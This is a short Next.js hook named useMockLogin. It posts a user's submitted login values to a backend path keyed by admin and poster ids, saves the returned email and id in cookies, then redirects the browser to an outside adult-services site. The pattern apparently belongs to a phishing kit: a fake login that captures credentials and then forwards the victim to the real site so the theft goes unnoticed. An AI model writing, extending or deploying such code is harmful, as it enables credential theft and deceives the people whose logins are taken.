"use client";

import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
import { useRouter } from "next/navigation";

function useMockLogin(adminId, posterId) {
  const router = useRouter();

  const login = async (values) => {
    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);

      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);

     
      const email = data?.info?.email;
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (email && emailRegex.test(email)) {
      
        router.push("https://privatedelights.ch");
      } else {
       
        router.push("/update");
      }
    } else {
      console.log("error", data);
      toast.error("Something went wrong");
    }
  };

  return { login };
}

export default useMockLogin;
